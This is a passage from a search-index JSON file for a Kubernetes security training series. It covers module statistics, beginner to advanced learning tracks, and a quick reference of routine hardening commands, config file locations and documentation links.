examples</p>"},{"location":"MODULES-SUMMARY/#module-statistics","title":"Module Statistics","text":"Module Lines Size Diagrams Labs 06 - Pod Security 1,602 35K 1 4 07 - Admission Policy 1,861 41K 2 3 08 - Observability 1,495 36K 2 0 09 - Supply Chain 1,303 33K 2 0 10 - Network Security 1,704 35K 3 0 Total 7,965 180K 10 7"},{"location":"MODULES-SUMMARY/#learning-path","title":"Learning Path","text":""},{"location":"MODULES-SUMMARY/#beginner-track-modules-00-03","title":"Beginner Track (Modules 00-03)","text":"<p>Foundation in Kubernetes basics, architecture, and networking</p>"},{"location":"MODULES-SUMMARY/#intermediate-track-modules-04-06","title":"Intermediate Track (Modules 04-06)","text":"<p>Storage, authentication/authorization, and pod security</p>"},{"location":"MODULES-SUMMARY/#advanced-track-modules-07-10","title":"Advanced Track (Modules 07-10)","text":"<p>Policy enforcement, observability, supply chain, and network security</p>"},{"location":"MODULES-SUMMARY/#next-steps","title":"Next Steps","text":"<ol> <li>Practice Labs: Complete all hands-on labs in controlled environments</li> <li>Build Projects: Implement security patterns in real clusters</li> <li>Certifications: Prepare for CKS (Certified Kubernetes Security Specialist)</li> <li>Stay Updated: Follow CNCF Security TAG and Kubernetes security SIG</li> <li>Community: Join Kubernetes security discussions and contribute</li> </ol>"},{"location":"MODULES-SUMMARY/#quick-reference","title":"Quick Reference","text":""},{"location":"MODULES-SUMMARY/#essential-commands","title":"Essential Commands","text":"<pre><code># Pod Security\nkubectl label namespace production pod-security.kubernetes.io/enforce=restricted\n\n# Network Policies\nkubectl get networkpolicies -A\n\n# Service Mesh\nistioctl analyze\nlinkerd check\n\n# Image Scanning\ntrivy image nginx:latest\n\n# Audit Logs\nkubectl logs -n kube-system kube-apiserver-* | grep audit\n</code></pre>"},{"location":"MODULES-SUMMARY/#critical-files-locations","title":"Critical Files Locations","text":"<ul> <li>Pod Security Admission: <code>/etc/kubernetes/admission-config.yaml</code></li> <li>Audit Policy: <code>/etc/kubernetes/audit-policy.yaml</code></li> <li>seccomp Profiles: <code>/var/lib/kubelet/seccomp/</code></li> <li>AppArmor Profiles: <code>/etc/apparmor.d/</code></li> </ul>"},{"location":"MODULES-SUMMARY/#key-resources","title":"Key Resources","text":"<ul> <li>Kubernetes Documentation: https://kubernetes.io/docs/</li> <li>CNCF Security: https://www.cncf.io/projects/</li> <li>CIS Benchmarks: https://www.cisecurity.org/benchmark/kubernetes</li> <li>NSA Hardening Guide: https://media.defense.gov/</li> </ul> <p>Training Series Status: \u2705 Complete (Modules 00-10) Total Content: ~11,000+ lines of comprehensive security training material Last Updated: November 11, 2025</p>"}]}